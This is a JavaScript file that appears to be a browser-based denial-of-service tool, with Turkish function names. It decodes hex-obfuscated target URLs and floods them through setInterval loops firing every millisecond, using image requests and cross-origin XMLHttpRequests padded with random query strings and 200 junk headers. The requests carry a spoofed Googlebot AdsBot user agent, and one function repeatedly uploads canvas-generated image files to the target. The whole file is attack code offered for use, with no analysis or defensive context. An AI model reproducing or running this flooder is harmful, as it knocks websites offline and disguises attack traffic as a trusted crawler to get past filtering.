  function rnd() {
      var rnd = '';
      for (var i = 0; i < 5; i += 1)
            rnd += Math.random().toString(36).substr(2, 7);
      return rnd;
  }

  function rndata() {
    var rnd = '';
    for (var i = 0; i < 30; i += 1)
          rnd += '&a'+Math.random().toString(36).substr(2, 7)+'='+Math.random().toString(36).substr(2, 7);
    return rnd;
  }

  function h2s(h) {
      var s = '';
      for (var i = 0; i < h.length; i += 2)
          s += String.fromCharCode(parseInt(h.substr(i, 2), 16));  
      return s;
  }

  function dataURItoBlob(dataURI) {
      var binary = atob(dataURI.split(',')[1]);
      var array = [];
      for(var i = 0; i < binary.length; i++) {
          array.push(binary.charCodeAt(i));
      }
      return new Blob([new Uint8Array(array)], {type: 'image/jpeg'});
  }

  function ImageUrlToBase64(url,imgurl,tur) {

    var img = new Image();
    img.setAttribute('crossOrigin', 'anonymous');
    img.src = imgurl;

    img.onload = function () {
        var canvas = document.createElement("canvas");
        canvas.width =this.width;
        canvas.height =this.height;

        var ctx = canvas.getContext("2d");
        ctx.drawImage(this, 0, 0);
        var dataURL = canvas.toDataURL("image/png");
        //console.log(dataURL.replace(/^data:image\/(png|jpg);base64,/, ""));

        if(tur == 'base64'){

           var fd = new FormData();
           fd.append("file1", dataURL);
             //fd.append("file2", dataURL);

        } else if(tur == 'file') {

          var blob = dataURItoBlob(dataURL);
          var fd = new FormData(document.forms[0]);
          fd.append("file1", blob);
           //fd.append("file2", blob);

        }

        istek_cors('POST', url+rnd()).send(fd);
        //setInterval(function() {istek_cors('POST', url+rnd()).send();}, 0);

    };
    
  }
  

  function istek_cors(method, url) {
    var istek = new XMLHttpRequest();
    if ("withCredentials" in istek) { // chrome,safar,firefox,opera
      istek.open(method, url, true);
      istek.setRequestHeader('user_agent', 'AdsBot-Google (+http://www.google.com/adsbot.html)');
      istek.setRequestHeader('User-Agent', 'AdsBot-Google (+http://www.google.com/adsbot.html)');
      for (var i = 0; i < 200; i+=1){
          istek.setRequestHeader(rnd(), '234234');
      }
    } else if (typeof XDomainRequest != "undefined") { // internet explorer
      istek = new XDomainRequest();
      istek.open(method, url);
    } else { // bambaşka bir cros desteklemeyen browser ise
      istek = null;
      //console.log("browser cors desteklemiyor");
    }
    return istek;
  }

  function istek_img(h,t) {
    if(t == '1'){
      setInterval(function() { var pic = new Image(); pic.src = h2s(h)+rnd(); }, 1);
    } else {
      setInterval(function() { var pic = new Image(); pic.src = h2s(h)+rndata(); }, 1);
    }
  }  

  function cok(h) {
    setInterval(function() {istek_cors('GET', h2s(h)+rnd()).send();}, 1);
  }

  function tek(h) {
    istek_cors('GET', h2s(h)+rnd()).send();
  }